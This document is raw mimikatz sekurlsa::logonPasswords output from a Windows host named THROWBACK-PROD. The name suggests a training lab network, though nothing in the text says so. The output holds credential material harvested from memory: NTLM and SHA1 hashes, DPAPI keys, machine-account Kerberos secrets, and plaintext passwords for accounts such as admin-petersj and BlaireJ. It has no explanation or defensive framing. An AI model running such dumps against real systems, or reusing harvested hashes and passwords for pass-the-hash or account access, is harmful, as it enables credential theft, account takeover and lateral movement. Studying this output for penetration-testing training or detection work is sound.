# sekurlsa::logonPasswords output

```mimikatz
mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 540478 (00000000:00083f3e)
Session           : RemoteInteractive from 2
User Name         : PetersJ
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-21-3906589501-690843102-3982269896-1202
        msv :
         [00000003] Primary
         * Username : PetersJ
         * Domain   : THROWBACK
         * NTLM     : b81e7daf21f66ff3b8f7c59f3b88f9b6
         * SHA1     : c0c2f57355e44b7fadbfe9921537d452133997f4
         * DPAPI    : 3bf226ffb12ebe58a21b1a5758072047
        tspkg :
        wdigest :
         * Username : PetersJ
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : PetersJ
         * Domain   : THROWBACK.LOCAL
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin-petersj
         * Domain   : localadmin.pass
         * Password : SinonFTW123!
         [00000001]
         * Username : THROWBACK-PROD\admin-petersj
         * Domain   : THROWBACK-PROD\admin-petersj
         * Password : SinonFTW123!

Authentication Id : 0 ; 504233 (00000000:0007b1a9)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 218170 (00000000:0003543a)
Session           : Batch from 0
User Name         : BlaireJ
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 4/20/2022 10:23:47 AM
SID               : S-1-5-21-3906589501-690843102-3982269896-1116
        msv :
         [00000003] Primary
         * Username : BlaireJ
         * Domain   : THROWBACK
         * NTLM     : c374ecb7c2ccac1df3a82bce4f80bb5b
         * SHA1     : 6522277853426f24275c4c0b0381458ef452e640
         * DPAPI    : db241bce607cacb4b04d032e25071f0f
        tspkg :
        wdigest :
         * Username : BlaireJ
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : BlaireJ
         * Domain   : THROWBACK.LOCAL
         * Password : 7eQgx6YzxgG3vC45t5k9
        ssp :
        credman :

Authentication Id : 0 ; 62220 (00000000:0000f30c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:33 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : THROWBACK-PROD$
Domain            : THROWBACK
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : throwback-prod$
         * Domain   : THROWBACK.LOCAL
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 32509 (00000000:00007efd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 32409 (00000000:00007e99)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 31116 (00000000:0000798c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:31 AM
SID               :
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 1142819 (00000000:00117023)
Session           : Interactive from 0
User Name         : admin-petersj
Domain            : THROWBACK-PROD
Logon Server      : THROWBACK-PROD
Logon Time        : 4/20/2022 10:44:19 AM
SID               : S-1-5-21-1142397155-17714838-1651365392-1010
        msv :
         [00000003] Primary
         * Username : admin-petersj
         * Domain   : THROWBACK-PROD
         * NTLM     : 74fb0a2ee8a066b1e372475dcbc121c5
         * SHA1     : ae40d7644fc099822b85ce01185468a35b5a16b1
        tspkg :
        wdigest :
         * Username : admin-petersj
         * Domain   : THROWBACK-PROD
         * Password : (null)
        kerberos :
         * Username : admin-petersj
         * Domain   : THROWBACK-PROD
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 503541 (00000000:0007aef5)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * NTLM     : 4d63c469d4399c0fa0db3731aa8b3dda
         * SHA1     : 41c11c7af0a6363272cc1987213b70f99915ae67
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:34 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 94883 (00000000:000172a3)
Session           : Batch from 0
User Name         : Administrator
Domain            : THROWBACK-PROD
Logon Server      : THROWBACK-PROD
Logon Time        : 4/20/2022 10:23:34 AM
SID               : S-1-5-21-1142397155-17714838-1651365392-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THROWBACK-PROD
         * NTLM     : a06e58d15a2585235d18598788b8147a
         * SHA1     : 4e40938facb10fb6aa244240301b791a0454f328
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : THROWBACK-PROD
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : THROWBACK-PROD
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin-petersj
         * Domain   : THROWBACK-PROD
         * Password : SinonFTW123!
         [00000001]
         * Username : admin-petersj
         * Domain   : Login
         * Password : SinonFTW123!
         [00000002]
         * Username : THROWBACK-PROD\admin-petersj
         * Domain   : THROWBACK-PROD\admin-petersj
         * Password : SinonFTW123!

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:33 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : THROWBACK-PROD$
Domain            : THROWBACK
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:31 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK
         * Password : (null)
        kerberos :
         * Username : throwback-prod$
         * Domain   : THROWBACK.LOCAL
         * Password : (null)
        ssp :
        credman :

```